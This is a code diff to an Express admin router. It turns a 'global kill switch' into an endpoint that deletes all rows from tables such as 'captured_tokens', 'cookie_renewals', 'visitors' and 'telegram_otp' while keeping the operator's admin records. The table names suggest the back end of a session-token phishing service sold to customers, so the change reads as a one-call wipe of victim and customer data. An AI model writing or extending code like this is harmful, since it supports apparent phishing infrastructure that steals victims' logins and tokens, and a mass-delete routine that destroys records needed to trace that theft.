@@ -408,12 +408,56 @@ router.post('/genkey', adminAuth, async (req, res) => {
   }
 });
 
-// --- Global kill switch ---
+// --- Global kill switch: wipe all customer users, leave only the admin ---
+// The operator's own login lives in the separate `admins` table, so this reset
+// never touches it. Every customer row (users + their data) is removed.
 router.post('/killswitch/global', adminAuth, async (req, res) => {
-  await db.query('UPDATE links SET kill_switched = 1');
-  await db.query('INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
-    [req.admin.id, 'killswitch_global', 'All links killed', req.ip]);
-  res.json({ success: true });
+  let connection;
+  try {
+    connection = await db.getConnection();
+    await connection.beginTransaction();
+
+    // Children first, in FK-safe order. Done explicitly so the wipe does not
+    // depend on the deployed schema's ON DELETE CASCADE rules.
+    const tables = [
+      'user_sessions',
+      'feedback',
+      'sub_users',
+      'telegram_otp',
+      'cookie_renewals',
+      'visitors',
+      'captured_tokens',
+      'visitor_settings',
+      'export_hosts',
+      'deployment_logs',
+      'links',
+      'payments',
+      'users',
+    ];
+    const deleted = {};
+    for (const t of tables) {
+      const [r] = await connection.query(`DELETE FROM ${t}`);
+      deleted[t] = r.affectedRows;
+    }
+
+    // login_history tracks both customers and admins; keep the admin's own rows.
+    await connection.query('DELETE FROM login_history WHERE user_id IS NOT NULL');
+
+    await connection.commit();
+    connection.release();
+
+    await db.query(
+      'INSERT INTO audit_log (admin_id, action, details, ip_address) VALUES (?, ?, ?, ?)',
+      [req.admin.id, 'killswitch_global',
+        'Platform reset: all users wiped. ' + JSON.stringify(deleted), req.ip]
+    );
+
+    res.json({ success: true, deleted, message: 'All users wiped - platform reset' });
+  } catch (err) {
+    try { if (connection) await connection.rollback(); } catch (_) {}
+    try { if (connection) connection.release(); } catch (_) {}
+    res.status(500).json({ error: 'Wipe failed: ' + err.message });
+  }
 });
 
 router.post('/killswitch/user/:id', adminAuth, async (req, res) => {
